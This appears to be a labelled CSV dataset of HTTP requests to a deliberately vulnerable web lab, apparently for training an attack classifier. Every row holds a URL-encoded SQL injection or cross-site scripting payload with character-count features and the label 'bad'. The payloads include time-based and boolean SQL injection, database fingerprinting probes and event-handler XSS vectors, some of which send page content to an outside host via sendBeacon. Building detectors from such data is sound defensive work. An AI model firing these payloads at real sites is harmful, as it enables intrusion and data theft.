method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/vulnerabilities/xss_r/?name=1%27+AND+%5BRANDNUM%5D%3DDBMS_PIPE.RECEIVE_MESSAGE%28%27%5BRANDSTR%5D%27%2C%5BSLEEPTIME%5D%29&user_token=6cd33d3a07e9eea3aaab3d6f722e5281,,3,0,0,1,2,0,bad
GET,/vulnerabilities/xss_r/?name=admin%22%29+or+%28%221%22%3D%221%22%2F*&user_token=d120f4c1da3f5089ea5b4035ca6496b7,,0,5,0,1,2,0,bad
GET,/vulnerabilities/xss_r/?name=admin%22%29+or+%28%221%22%3D%221%22--&user_token=c5daddbb7a3ec7a535fe0ce4545eb3c0,,0,5,1,1,2,0,bad
GET,/vulnerabilities/xss_r/?name=admin%22%29+or+%221%22%3D%221%22%2F*&user_token=24fdb6dfe1d57f887a310c083bb1b941,,0,5,0,0,2,0,bad
GET,/vulnerabilities/sqli/?id=1%27+AND+123%3DDBMS_PIPE.RECEIVE_MESSAGE%28%27ASD%27%2C10%29&Submit=Submit&user_token=8b263ae522240a469f071123876453b7,,3,0,0,1,2,0,bad
GET,/vulnerabilities/xss_r/?name=admin%22or+1%3D1+or+%22%22%3D%22&user_token=99c3b25d651a69327914fa8b8d52174f,,0,4,0,0,3,0,bad
GET,/vulnerabilities/sqli/?id=%5B%22quote_literal%2842.5%29%3Dquote_literal%2842.5%29%22+++++++++%2C%22POSTGRESQL%22%5D&Submit=Submit&user_token=51c313f591493a9c958e3f4b00a76a1f,,0,4,0,2,9,0,bad
GET,/vulnerabilities/sqli/?id=%5B%22last_insert_rowid%28%29%3Dlast_insert_rowid%28%29%22+++++++++%2C%22SQLITE%22%5D&Submit=Submit&user_token=6b99aa5fbaf938acd83b7c5df6d9c18e,,0,4,0,2,9,0,bad
GET,/vulnerabilities/xss_r/?name=admin%22%29+or+%28%221%22%3D%221&user_token=d8f30d12f5e56f8a713f70034aacb8db,,0,4,0,1,2,0,bad
GET,/vulnerabilities/sqli/?id=%5B%22connection_id%28%29%3Dconnection_id%28%29%22+++++++++++++++++%2C%22MYSQL%22%5D%2C&Submit=Submit&user_token=745d8f94744901a6b6d83bf6de144e03,,0,4,0,2,17,0,bad
GET,/vulnerabilities/sqli/?id=%5B%22RAWTOHEX%28%27AB%27%29%3DRAWTOHEX%28%27AB%27%29%22+++++++++++++++++++%2C%22ORACLE%22%5D&Submit=Submit&user_token=e1d899647ef98ff7403f1310e837f897,,4,4,0,2,19,0,bad
GET,/vulnerabilities/sqli/?id=%5B%22conv%28%27a%27%2C16%2C2%29%3Dconv%28%27a%27%2C16%2C2%29%22+++++++++++++++++++%2C%22MYSQL%22%5D%2C&Submit=Submit&user_token=bb1527257b072c8132bb1f6a4e9e3866,,4,4,0,2,19,0,bad
GET,/vulnerabilities/sqli/?id=%5B%22%40%40CONNECTIONS%3D%40%40CONNECTIONS%22+++++++++++++++++++++%2C%22MSSQL%22%5D%2C&Submit=Submit&user_token=9a989213355029fdcccab4306a1e64a2,,0,4,0,0,21,0,bad
GET,/vulnerabilities/sqli/?id=%5B%22BINARY_CHECKSUM%28123%29%3DBINARY_CHECKSUM%28123%29%22+++++++%2C%22MSSQL%22%5D%2C&Submit=Submit&user_token=eda9bd7a82c4be57feca30dac84c53cc,,0,4,0,2,7,0,bad
GET,/vulnerabilities/sqli/?id=%5B%22pg_client_encoding%28%29%3Dpg_client_encoding%28%29%22+++++++%2C%22POSTGRESQL%22%5D&Submit=Submit&user_token=10aa08f40247033471a657dbfb2010a0,,0,4,0,2,7,0,bad
GET,/vulnerabilities/sqli/?id=%5B%22current_database%28%29%3Dcurrent_database%28%29%22+++++++++++%2C%22POSTGRESQL%22%5D&Submit=Submit&user_token=9469a735f76f553490565df1b16feba4,,0,4,0,2,11,0,bad
GET,/vulnerabilities/xss_r/?name=1%27+WAITFOR+DELAY+%270%3A0%3A10%27&user_token=d175efcf8d7d6d80af6fcc5847f44b95,,3,0,0,0,3,0,bad
GET,/vulnerabilities/sqli/?id=1%27+AND+123%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%281000000000%2F2%29%29%29%29&Submit=Submit&user_token=258ddfae4aff582ad9313b77b28a47f7,,3,0,0,4,2,0,bad
GET,/vulnerabilities/xss_r/?name=1234+%22+AND+1%3D0+UNION+ALL+SELECT+%22admin%22%2C+%2281dc9bdb52d04dc20036dbd8313ed055&user_token=490418f7439626f2cefcd2e30229180f,,0,4,0,0,8,0,bad
GET,/vulnerabilities/xss_r/?name=admin%22+or+%221%22%3D%221%22%2F*&user_token=e09463560cb6f8594600d972d33bf71e,,0,5,0,0,2,0,bad
GET,/vulnerabilities/xss_r/?name=admin%22%29+or+%28%221%22%3D%221%22%23&user_token=c751738c6a2a9bc7f0bea3f129508f73,,0,5,0,1,2,0,bad
GET,/vulnerabilities/sqli/?id=admin%22%29+or+%221%22%3D%221%22%2F*&Submit=Submit&user_token=8dc3e295a827d1cdd2bcbaf346799618,,0,5,0,0,2,0,bad
GET,/vulnerabilities/sqli/?id=admin%22%29+or+%221%22%3D%221%22%23&Submit=Submit&user_token=180779ce65c0940d8c8e7f20a7d3eca1,,0,5,0,0,2,0,bad
GET,/vulnerabilities/sqli/?id=admin%22%29+or+%28%221%22%3D%221%22%23&Submit=Submit&user_token=8e655c98ab132e7d55eed76b9a6026bc,,0,5,0,1,2,0,bad
GET,/vulnerabilities/sqli/?id=admin%22%29+or+%221%22%3D%221%22--&Submit=Submit&user_token=561cc34f794da6d925edfafa3de69884,,0,5,1,0,2,0,bad
GET,/vulnerabilities/sqli/?id=admin%22%29+or+%221%22%3D%221%22--&Submit=Submit&user_token=daa7bff8295104b38e071d998c28d504,,0,5,1,0,2,0,bad
GET,/vulnerabilities/sqli/?id=admin%22%29+or+%28%221%22%3D%221%22%2F*&Submit=Submit&user_token=e8cd052f64ddd79fe920347b05627d5a,,0,5,0,1,2,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onbeforescriptexecute%3Dalert%281%29%3E%3Cscript%3E1%3C%2Fscript%3E&user_token=fb0604229f7e68885dfd9bfa725c35b1,,0,0,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Caudio+oncanplay%3Dalert%281%29%3E%3Csource+src%3D%22validaudio.wav%22+type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&user_token=07c2398e91421be603e0eaf6d3fc7ca0,,0,4,0,1,3,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cxss+id%3Dx+style%3D%22transition%3Acolor+1s%22+onwebkittransitionend%3Dalert%281%29%3E%3C%2Fxss%3E&user_token=229ab8252d7b6177be7c5764e65a8200,,0,2,0,1,5,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cxss+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fxss%3E&user_token=7f30571da99b01784a59bcd6688b8951,,0,2,0,1,6,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cxss+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dprint%28%29%3E%3C%2Fxss%3E&user_token=07681a61ee3c410d474aab85e6961196,,0,2,0,1,6,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onunload%3Dnavigator.sendBeacon%28%27%2F%2Fhttps%3A%2F%2Fssl.portswigger-labs.net%2F%27%2Cdocument.body.innerHTML%29%3E&user_token=260664ac173badd4c3eb9c08e5806919,,2,0,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onpointerrawupdate%3Dalert%281%29%3EXSS%3C%2Fxss%3E&user_token=0ea6694189dd800ac06e583f2c2ca87a,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E&user_token=0b7a1307bfd1b497f5197f2061de87f9,,0,2,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fa%3E&user_token=eab675843f65482e733ed86f871174d3,,0,2,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cxss+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fxss%3E&user_token=22d9370f0dc8d4c4d173e1c2d9dc8382,,0,2,0,1,6,3,bad
GET,/vulnerabilities/xss_r/?name=%3Csvg%3E%3Canimate+onend%3Dalert%281%29+attributeName%3Dx+dur%3D1s%3E&user_token=620045030fdee04c017acb172de84378,,0,0,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onbeforeprint%3Dconsole.log%281%29%3E&user_token=7a970fa3044ce1d624914054e4e4dd4d,,0,0,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fa%3E&user_token=ea442873fcbc2587e16e9a075dc0fbdb,,0,2,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E&user_token=b7219af5e2a02bb843b3b67611c9591e,,0,2,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onpointerover%3Dalert%281%29%3EXSS%3C%2Fxss%3E&user_token=6c1b9e0014e3f9eb6ce6ac97479900c3,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onpagehide%3Dnavigator.sendBeacon%28%27%2F%2Fhttps%3A%2F%2Fssl.portswigger-labs.net%2F%27%2Cdocument.body.innerHTML%29%3E&user_token=7430808dee772faa0db8db87cd311880,,2,0,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Caudio+controls+onprogress%3Dalert%281%29%3E%3Csource+src%3Dvalidaudio.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E&user_token=bd32ac9e07ba360662b496311570e178,,0,0,0,1,4,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E&user_token=2c98cee519183d1b910953e110650884,,0,4,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Capplet+onreadystatechange%3Dalert%281%29%3E%3C%2Fapplet%3E&user_token=18a51b9328bef15be5c55f3647ff3c9c,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fa%3E&user_token=212d8318935300f9c25659ea7dab7472,,0,2,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fa%3E&user_token=d8ee410c75bc80dd6ac9ffe00a5b939e,,0,0,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onmessage%3Dprint%28%29%3E&user_token=92c9f6be785bce136cc8c3a3c350b638,,0,0,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cdialog+open+onclose%3Dalert%281%29%3E%3Cform+method%3Ddialog%3E%3Cbutton%3EXSS%3C%2Fbutton%3E%3C%2Fform%3E&user_token=9bee2afd240fd2f83ced781cbd75b52b,,0,0,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E&user_token=d64aecda29500a6ec041adc0ce3c9e4d,,0,4,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onpageshow%3Dalert%281%29%3E&user_token=abf05b6108cb3d79cdbafb8f7e6658f1,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onpointerdown%3Dalert%281%29%3EXSS%3C%2Fxss%3E&user_token=60dee68aaba0ac1f8abd37770ce8d61c,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_d/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Csvg%3E%3Canimate+onrepeat%3Dalert%281%29+attributeName%3Dx+dur%3D1s+repeatCount%3D2+%2F%3E&user_token=cf9ccebdf1da46ec5b66e146c54dc37c,,0,0,0,1,5,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+oncut%3Dalert%281%29+value%3D%22XSS%22+autofocus+tabindex%3D1%3Etest&user_token=b8c90bb8d7dde8fffba365de14114fa6,,0,2,0,1,4,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onscroll%3Dalert%281%29%3E%3Cdiv+style%3Dheight%3A1000px%3E%3C%2Fdiv%3E%3Cdiv+id%3Dx%3E%3C%2Fdiv%3E&user_token=e2990a92c84a72e88676eaba9f4cd273,,0,0,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cvideo+autoplay+controls+onwaiting%3Dalert%281%29%3E%3Csource+src%3D%22validvideo.mp4%22+type%3Dvideo%2Fmp4%3E%3C%2Fvideo%3E&user_token=68bfc474e2ba74487cb06de8e46001b8,,0,2,0,1,5,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fxss%3E&user_token=577e22e70ced367504a0e29fc5f04fd7,,0,2,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dprint%28%29%3E%3C%2Fxss%3E%3Cinput+autofocus%3E&user_token=ec870675aeb90b77d6ed5218084c2ab6,,0,0,0,1,4,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cxss+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fxss%3E&user_token=4eff846a9d09938010786165c9903627,,0,4,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cdialog+open+onclose%3Dalert%281%29%3E%3Cform+method%3Ddialog%3E%3Cbutton%3EXSS%3C%2Fbutton%3E%3C%2Fform%3E&user_token=7e86d566262c013280dcd1c01ef996dc,,0,0,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E&user_token=9507bdc93b30e27d792b3d232d92e59f,,0,4,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cmarquee+width%3D1+loop%3D1+onfinish%3Dalert%281%29%3EXSS%3C%2Fmarquee%3E&user_token=381bca671c20f0c2969d3aa0b9b296a7,,0,0,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E&user_token=3bdfdac356822472d9248800dfbb24a7,,0,2,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Csvg%3E%3Canimate+onbegin%3Dalert%281%29+attributeName%3Dx+dur%3D1s%3E&user_token=a763ba66e18b25c7714f9726e987c0b6,,0,0,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Caudio+controls+autoplay+ontimeupdate%3Dalert%281%29%3E%3Csource+src%3D%22validaudio.wav%22+type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&user_token=c97e17f7fa31eef3efacb30fa34c9893,,0,4,0,1,5,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cvideo+onfullscreenchange%3Dalert%281%29+src%3Dvalidvideo.mp4+controls%3E&user_token=112747e2f5e1e53e308cec79b7b08773,,0,0,0,1,3,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cinput+onauxclick%3Dalert%281%29%3E&user_token=51fa4c566fb933d96bb2ff2c49b5174c,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cimage+src%3Dvalidimage.png+onloadend%3Dalert%281%29%3E&user_token=136ed1c2470e2bb713b260fd9bc81073,,0,0,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fa%3E&user_token=06a2f588fa5a54db84eeb59c35c82597,,0,2,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cxss+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dprint%28%29%3E%3C%2Fxss%3E&user_token=b111420437167cafa8af814bdb53e147,,0,2,0,2,6,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E&user_token=8c1e56a8e746fd667b3321d480862c23,,0,4,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Caudio+autoplay+onloadedmetadata%3Dalert%281%29%3E+%3Csource+src%3D%22validaudio.wav%22+type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&user_token=2419376a47ee47d762be94120bdcf659,,0,4,0,1,5,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cvideo+controls%3E%3Csource+src%3Dvalidvideo.mp4+type%3Dvideo%2Fmp4%3E%3Ctrack+default+oncuechange%3Dalert%281%29+src%3D%22data%3Atext%2Fvtt%2CWEBVTT+FILE++1+00%3A00%3A00.000+--%3E+00%3A00%3A05.000++%3Cb%3EXSS%3C%2Fb%3E+%22%3E%3C%2Fvideo%3E&user_token=3f5e9e2db17f61cb83dc238d0b45fffd,,0,2,1,1,15,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onafterscriptexecute%3Dalert%281%29%3E%3Cscript%3E1%3C%2Fscript%3E&user_token=e43d7b8e359f98a03f1c3898f0b5ad5e,,0,0,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onpointerout%3Dalert%281%29%3EXSS%3C%2Fxss%3E&user_token=d3e687848c9ef46efd1fa79c66b2a723,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cform%3E%3Cinput+oninvalid%3Dalert%281%29+required%3E%3Cinput+type%3Dsubmit%3E&user_token=c0b8188378cc9922da9f8fe5788a00e7,,0,0,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cxss+style%3D%22animation-name%3Ax%22+onwebkitanimationstart%3D%22alert%281%29%22%3E%3C%2Fxss%3E&user_token=e766d8de0ca99c434f323744bf009e73,,0,4,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cxss+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onwebkitanimationiteration%3D%22alert%281%29%22%3E%3C%2Fxss%3E&user_token=a7c500bc0629eb2158e3065b6babc819,,0,4,0,1,4,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cvideo+oncanplaythrough%3Dalert%281%29%3E%3Csource+src%3D%22validvideo.mp4%22+type%3D%22video%2Fmp4%22%3E%3C%2Fvideo%3E&user_token=e26b5e4b6333adbd1b143e8994f7da57,,0,4,0,1,3,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cxss+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22print%28%29%22%3E%3C%2Fxss%3E&user_token=8b9221956ea8826ccac891bbc96d31ed,,0,4,0,1,12,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E&user_token=72397d7a4e4605de545785ff6e53509a,,0,4,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cvideo+onmozfullscreenchange%3Dalert%281%29+src%3Dvalidvideo.mp4+controls%3E&user_token=5ba3b9725aa51c152cca52b012b1240a,,0,0,0,1,3,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onpopstate%3Dprint%28%29%3E&user_token=8ae5d8c50691b13d56d7c618a92d1a69,,0,0,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fxss%3E&user_token=cdbb363442b0a3816c4ea66c0a955be6,,0,0,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onpointerleave%3Dalert%281%29%3EXSS%3C%2Fxss%3E&user_token=5f600b5578a2fd7f6a5c0b8d7e8783bb,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cxss+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionstart%3Dalert%281%29%3E%3C%2Fxss%3E&user_token=380dae1157e68dd58124db9944efe5c2,,0,2,0,1,5,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onhashchange%3D%22print%28%29%22%3E&user_token=df925a7c0cd2a3542c95fed110b29947,,0,2,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cmarquee+onstart%3Dalert%281%29%3EXSS%3C%2Fmarquee%3E&user_token=11d14c230dae4fbfe57e909c7aa6525b,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fxss%3E&user_token=f580d9eeb65d16857a87e66f93a82e87,,0,2,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cxss+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fxss%3E&user_token=ab49a12a7bd090da621666875acaf35c,,0,4,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cxss+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fxss%3E&user_token=c89e906e2e5038304daae2942a003366,,0,4,0,1,4,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E&user_token=f72a25dc394b6dcb4660e7fe107e1e61,,0,2,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Caudio+src%2Fonerror%3Dalert%281%29%3E&user_token=8bb4ccd10fde3939b2dec8ac491a2814,,0,0,0,1,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fa%3E&user_token=e0a681450467b1e27148f449988a939c,,0,2,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Caudio+autoplay+onplaying%3Dalert%281%29%3E%3Csource+src%3D%22validaudio.wav%22+type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&user_token=3bd3bf97d73caaed6edbf72d5294e9b2,,0,4,0,1,4,3,bad
GET,/vulnerabilities/xss_r/?name=%3Caudio+controls+ondurationchange%3Dalert%281%29%3E%3Csource+src%3Dvalidaudio.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E&user_token=a33a433da000d151a82d26b47d2403a8,,0,0,0,1,4,3,bad
GET,/vulnerabilities/xss_r/?name=%3Caudio+autoplay+controls+onpause%3Dalert%281%29%3E%3Csource+src%3D%22validaudio.wav%22+type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&user_token=4998d0ebac983bf7d98f13f40e2e5ef6,,0,4,0,1,5,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onbeforeunload%3Dnavigator.sendBeacon%28%27%2F%2Fhttps%3A%2F%2Fssl.portswigger-labs.net%2F%27%2Cdocument.body.innerHTML%29%3E&user_token=b463c3bafb609889be03a3c57deb3341,,2,0,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fxss%3E&user_token=6cf398376e37eeba0c7e1e336834f1ff,,0,0,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fa%3E%3Cinput+autofocus%3E&user_token=665e6f7e13152e7241e5fbe13ae452d0,,0,0,0,1,4,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+oncopy%3Dalert%281%29+value%3D%22XSS%22+autofocus+tabindex%3D1%3Etest&user_token=0e9520cd8504859b2315ccf611d12531,,0,2,0,1,4,2,bad
GET,/vulnerabilities/xss_r/?name=%3Caudio+onloadeddata%3Dalert%281%29%3E%3Csource+src%3D%22validaudio.wav%22+type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&user_token=94145191b4b3b8cd73b64c811a1843be,,0,4,0,1,3,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fxss%3E&user_token=eabe40e605eacccbf75544f8867ef50e,,0,2,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+oncut%3Dalert%281%29+value%3D%22XSS%22+autofocus+tabindex%3D1%3Etest&user_token=3b234b331126625c612323ca5569ae9c,,0,2,0,1,4,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cdetails+ontoggle%3Dalert%281%29+open%3Etest%3C%2Fdetails%3E&user_token=dd0eeeead0d248f96ef8ed8a8bf872d1,,0,0,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Caudio+controls+autoplay+onended%3Dalert%281%29%3E%3Csource+src%3D%22validaudio.wav%22+type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&user_token=9025bd57411b4bb7fc4e2034a1a2ab79,,0,4,0,1,5,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onunhandledrejection%3Dalert%281%29%3E%3Cscript%3Efetch%28%27%2F%2Fxyz%27%29%3C%2Fscript%3E&user_token=054436f17222392d575b9f4b05fa6a3f,,2,0,0,2,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+ondblclick%3D%22alert%281%29%22+autofocus+tabindex%3D1%3Etest%3C%2Fxss%3E&user_token=e7facbe33191d0f8739e40e50601d50c,,0,2,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cinput+onchange%3Dalert%281%29+value%3Dxss%3E&user_token=6339b97164c826fe897c372fd6dc9b4c,,0,0,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onload%3Dalert%281%29%3E&user_token=c7303f2b0f37b409cf0a9c82f2b1ad28,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cxss+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E&user_token=6629f004a5884c3552d33d9ac3090c26,,0,2,0,1,1,2,bad
